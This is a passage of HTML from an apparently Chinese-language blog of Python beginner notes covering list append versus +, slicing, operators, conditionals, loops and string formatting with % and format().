punctuation\">]</span></pre></td></tr></table></figure><p>结论：使用 append () 添加后，是在列表原列表 t 中添加，而不是 t1<br />\n 而使用 + 添加后，是在列表 t2 中添加，相当于在 t 中添加的结果重新放到了一个新的列表中，而原列表不变</p>\n<p>速度是否相同<br />\n代码分析：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>start1<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>t1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    t1<span class=\"token operator\">=</span>t1<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>end1<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"运行了%s秒\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>end1<span class=\"token operator\">-</span>start1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>start2<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>t2<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    t2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>end2<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"运行了%s秒\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>end2<span class=\"token operator\">-</span>start2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">##### 输出结果</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>运行了<span class=\"token number\">0.15612554550170898</span>秒</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>运行了<span class=\"token number\">0.0029811859130859375</span>秒</pre></td></tr></table></figure><p>结论：append（）的添加速度比 + 快</p>\n<h2 id=\"切片\"><a class=\"anchor\" href=\"#切片\">#</a> 切片</h2>\n<ol>\n<li>\n<p>特点<br />\n只能用于序列 (可以用下标获取元素的)：字符串，列表，元组<br />\n特点：起始下标不能比截止下标大</p>\n</li>\n<li>\n<p>用法<br />\n序列名 [起始下标：截止下标]<br />\n 特例：<br />\n①序列名 [:]: 截取序列中全部内容<br />\n②序列名 [起始下标：]：截取从起始下标开始的全部内容<br />\n③序列名 [: 截止下标]：截取从 0 开始到截止下标前一位的所有内容<br />\n④序列名 [: 负数]：截取倒数除了负数个数的全部内容<br />\n eg.list [:-3]: 截取 0 到倒数第四个的全部内容 (倒数第三个不用)</p>\n</li>\n<li>\n<p>列表的复制<br />\n①列表 1 = 列表 2：<br />\n列表 1 和列表 2 共用同一块内存地址，修改其中任意一个列表的值，另一个列表也会更改内容<br />\n②列表 1 = 列表 2 [:]</p>\n</li>\n</ol>\n<h2 id=\"运算符和表达式\"><a class=\"anchor\" href=\"#运算符和表达式\">#</a> 运算符和表达式</h2>\n<ol>\n<li>算数运算符</li>\n</ol>\n<p>‘+’‘-’‘*’‘/’‘%’‘//’(整除，求商)‘<strong>’(求幂，2 的三次方：2</strong>3)</p>\n<ol start=\"2\">\n<li>赋值运算符</li>\n</ol>\n<p>‘=’‘+=’‘-=’‘*=’‘/=’</p>\n<ol start=\"3\">\n<li>关系运算符 (返回一个 bool 值)</li>\n</ol>\n<p>‘&gt;’‘&lt;’‘==’‘&gt;=’‘&lt;=’‘!=’</p>\n<ol start=\"4\">\n<li>逻辑运算符</li>\n</ol>\n<p>‘and’‘or’‘not’<br />\n详解</p>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hb3h1ZXh1ZS9hcnRpY2xlL2RldGFpbHMvMTA1ODk5NTEy\"> https://blog.csdn.net/maoxuexue/article/details/105899512</span></p>\n<p>and<br />\n 格式：操作数 1 and 操作数 2<br />\n 如果操作数 1 的值为 True (无论是什么类型 True、1、-1、’ '), 那么运算结果就等于操作数 2。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token string\">'hello'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'hello'</span></pre></td></tr></table></figure><p>如果操作数 1 的值为 False (无论是什么类型 False、0、[]、’’), 那么运算结果就等于操作数 1。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>or（跟 and 相反）<br />\n格式：操作数 1 or 操作数 2<br />\n 如果操作数 1 的值为 True (无论是什么类型 True 1 -1 ‘hello’)，那么运算结果就等于操作数 1。<br />\n如果操作数 1 的值为 False (无论是什么类型 False 0 [] ‘’)，那么运算结果就等于操作数 2。</p>\n<p>逻辑 and/or 的短路原则<br />\n举例的话，就是 “表达式 1 and 表达式 2“，假如表达式 1 的值为 true，则会继续执行表达式 2，最终整个表达式的值也就取决于表达式 2 的值；假如表达式 1 的值为 false，则会短路，不再执行表达式 2，直接取表达式 1 的值，也就是 false。<br />\nand 换成 or 刚好反过来，假如表达式 1 的值为 true，则会短路，不再执行表达式 2，直接取表达式 1 的值，也就是 true；假如表达式 1 的值为 false，则会继续执行表达式 2，最终整个表达式的值也就取决于表达式 2 的值。</p>\n<ol start=\"5\">\n<li>三元运算符</li>\n</ol>\n<p>语法：操作 1 if 操作数 2 else 操作 3<br />\n 操作数 2 为真时，执行操作 1；操作数 2 为假时，执行操作 3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token keyword\">if</span> <span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>成员运算符</li>\n</ol>\n<p>‘in’‘not in’</p>\n<ol start=\"7\">\n<li>身份运算符</li>\n</ol>\n<p>‘is’‘is not’</p>\n<ol start=\"8\">\n<li>命令</li>\n</ol>\n<p>a. 循环语句：for /while 语句<br />\n b. 判断语句：if /if elif 语句<br />\n c. 顺序语句</p>\n<h2 id=\"条件判断和循环\"><a class=\"anchor\" href=\"#条件判断和循环\">#</a> 条件判断和循环</h2>\n<h3 id=\"条件判断\"><a class=\"anchor\" href=\"#条件判断\">#</a> 条件判断</h3>\n<p>计算机之所以能做很多自动化的任务，因为它可以自己做条件判断。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">1</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">elif</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">2</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">elif</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">3</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">4</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#---------------------------------------------#</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#if 判断条件还可以简写，比如写：</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> x<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'True'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 只要 x 是非零数值、非空字符串、非空 list 等，就判断为 True，否则为 False。</span></pre></td></tr></table></figure><p><em><strong>注意不要忘记冒号:</strong></em></p>\n<h3 id=\"循环\"><a class=\"anchor\" href=\"#循环\">#</a> 循环</h3>\n<p>为了让计算机能计算成千上万次的重复运算，我们就需要循环语句。</p>\n<h4 id=\"while-循环\"><a class=\"anchor\" href=\"#while-循环\">#</a> while 循环</h4>\n<p>Python 中 while 语句的一般形式：</p>\n<pre><code>while 判断条件(condition)：\n    执行语句(statements)……\n</code></pre>\n<p>菜鸟教程执行流程图<img data-src=\"image002.jpg\" alt=\"\" /><br />\n菜鸟教程的 GIF 图片<img data-src=\"image001.gif\" alt=\"\" /></p>\n<p><em><strong>同样需要注意冒号和缩进。另外，在 Python 中没有 do..while 循环。</strong></em></p>\n<p><strong>while 循环使用 else 语句</strong><br />\n在 while … else 在条件语句为 false 时执行 else 的语句块。</p>\n<p>语法格式如下：</p>\n<pre><code>while &lt;expr&gt;:\n    &lt;statement(s)&gt;\nelse:\n    &lt;additional_statement(s)&gt;\n</code></pre>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#循环输出数字，并判断大小：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>count <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> count <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 小于 5\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   count <span class=\"token operator\">=</span> count <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 大于或等于 5\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">## 输出结果</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">0</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">1</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">3</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">4</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">5</span>  大于或等于 <span class=\"token number\">5</span></pre></td></tr></table></figure><h4 id=\"for-语句\"><a class=\"anchor\" href=\"#for-语句\">#</a> for 语句</h4>\n<p>Python for 循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>\n<p>for 循环的一般格式如下：</p>\n<pre><code>for &lt;variable&gt; in &lt;sequence&gt;:\n    &lt;statements&gt;\nelse:\n    &lt;statements&gt;\n</code></pre>\n<p>菜鸟教程执行流程图<img data-src=\"image003.jpg\" alt=\"\" /></p>\n<p>for 循环经常与 range () 函数结合使用<br />\n菜鸟教程链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLWZ1bmMtcmFuZ2UuaHRtbA==\">range 函数</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#可以使用 range () 函数来创建一个列表：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"break与continue\"><a class=\"anchor\" href=\"#break与continue\">#</a> break 与 continue</h4>\n<p>break 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。</p>\n<p>continue 语句被用来告诉 Python 跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>\n<h2 id=\"字符串与编码\"><a class=\"anchor\" href=\"#字符串与编码\">#</a> 字符串与编码</h2>\n<p>字符串也是一种数据类型，但它涉及到编码问题，Python3 中默认使用的是 Unicode 编码。关于计算机编码的问题我已经解决了，在</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIwLzEyLzA5LyVFOCVBRSVBMSVFNyVBRSU5NyVFNiU5QyVCQSVFNyVCQyU5NiVFNyVBMCU4MSVFNCVCOCU4RSVFOCVCRiU5QiVFNSU4OCVCNi8=\">计算机编码与进制</span>一文中。</p>\n<p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为 UTF-8 编码。当 Python 解释器读取源代码时，为了让它按 UTF-8 编码读取，我们通常在文件开头写上这两行：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr></table></figure><h2 id=\"字符串的格式化输出\"><a class=\"anchor\" href=\"#字符串的格式化输出\">#</a> 字符串的格式化输出</h2>\n<h3 id=\"的用法\"><a class=\"anchor\" href=\"#的用法\">#</a> % 的用法</h3>\n<p>1、整数的输出<br />\n % o —— oct 八进制<br />\n % d —— dec 十进制<br />\n % x —— hex 十六进制<br />\n 2、浮点数输出<br />\n（1）格式化输出<br />\n %<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1tLTJjYS5uZg==\">±m.nf</span><br />\n + 号可以省略，表示右对齐。- 号表示左对齐。m 表示占多少位，n 表示保留小数点后几位.</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数字%6.6f\"</span> <span class=\"token operator\">%</span>  a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>数字<span class=\"token number\">6.900000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数字%6.2f\"</span> <span class=\"token operator\">%</span>  a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>数字  <span class=\"token number\">6.90</span></pre></td></tr></table></figure><p>% f —— 保留小数点后面六位有效数字<br />\n % e —— 保留小数点后面六位有效数字，指数形式输出<br />\n % g —— 在保证六位有效数字的前提下，使用小数方式，否则使用科学计数法<br />\n %.3g，保留 3 位有效数字，使用小数或科学计数法<br />\n字符串格式代码<img data-src=\"image002.png\" alt=\"\" /><br />\n常用转义字符<img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"format的用法\"><a class=\"anchor\" href=\"#format的用法\">#</a> format 的用法</h3>\n<p>相对基本格式化输出采用‘%’的方法，format () 功能更强大，该函数把字符串当成一个模板，通过传入的参数进行格式化，并且使用大括号‘{}’作为特殊字符代替‘%’</p>\n<ol>\n<li>位置匹配<br />\n (1) 不带编号，即 “{}”<br />\n(2) 带数字编号，可调换顺序，即 “{1}”、“{2}”<br />\n(3) 带关键字，即 “{a}”、“{tom}”<br />\n(4) 通过下标或 key 匹配参数</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 不带字段</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; &#123;1&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 带数字编号</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; &#123;1&#125; &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打乱顺序</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>hello world hello</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;1&#125; &#123;1&#125; &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>world world hello</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;a&#125; &#123;tom&#125; &#123;a&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>tom<span class=\"token operator\">=</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">=</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 带关键字</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>world hello world</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> coord <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'X: &#123;0[0]&#125;;  Y: &#123;0[1]&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>coord<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#通过下标或 key</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">'X: 3;  Y: 5'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>格式转换</li>\n</ol>\n<p>'b' - 二进制。将数字以 2 为基数进行输出。<br />\n'c' - 字符。在打印之前将整数转换成对应的 Unicode 字符串。<br />\n'd' - 十进制整数。将数字以 10 为基数进行输出。<br />\n'o' - 八进制。将数字以 8 为基数进行输出。<br />\n'x' - 十六进制。将数字以 16 为基数进行输出，9 以上的位数用小写字母。<br />\n'e' - 幂符号。用科学计数法打印数字。用 'e' 表示幂。<br />\n'g' - 一般格式。将数值以 fixed-point 格式输出。当数值特别大的时候，用幂形式打印。<br />\n'n' - 数字。当值为整数时和 'd' 相同，值为浮点数时和 'g' 相同。不同的是它会根据区域设置插入数字分隔符。<br />\n'%' - 百分数。将数值乘以 100 然后以 fixed-point ('f') 格式打印，值后面会有一个百分号。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0:b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:c&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\u0014</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token 